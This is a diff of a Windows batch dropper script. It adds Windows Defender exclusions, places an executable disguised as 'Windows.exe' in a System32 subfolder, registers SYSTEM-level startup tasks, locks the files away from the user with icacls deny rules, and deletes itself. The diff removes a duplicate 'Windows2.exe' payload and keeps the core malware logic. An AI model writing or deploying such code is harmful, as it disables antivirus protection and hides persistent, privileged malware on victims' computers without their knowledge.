@@ -18,8 +18,6 @@ cls
 cls
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
 cls
-powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows2.exe'"
-cls
 md "%systemroot%\System32\Windowsexe"
 cls
 
@@ -43,21 +41,15 @@ start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
 cls
 move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
 cls
-copy "%systemroot%\System32\Windowsexe\Windows.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
-cls
-start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
-cls
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
 cls
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
-SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL HIGHEST
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
 cls
 del /f NSudo.exe
 cls
 timeout /t 2 /nobreak
 icacls  "%systemroot%\System32\Windowsexe\Windows.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
-icacls  "%systemroot%\System32\Windowsexe\Windows2.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 cls
 icacls  "%systemroot%\System32\Windowsexe\AV.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 cls
@@ -65,13 +57,9 @@ icacls "%systemroot%\System32\Windowsexe\AV.bat" /grant everyone:(OI)(CI)R "%use
 cls
 icacls "%systemroot%\System32\Windowsexe\Windows.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
 cls
-icacls "%systemroot%\System32\Windowsexe\Windows2.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
-cls
 icacls "%systemroot%\System32\Windowsexe\AV.bat" /deny everyone:R "%username%":R
 cls
 icacls "%systemroot%\System32\Windowsexe\Windows.exe" /deny everyone:R "%username%":R
-cls
-icacls "%systemroot%\System32\Windowsexe\Windows2.exe" /deny everyone:R "%username%":R
 cls
 call :deleteSelf&exit
 :deleteSelf
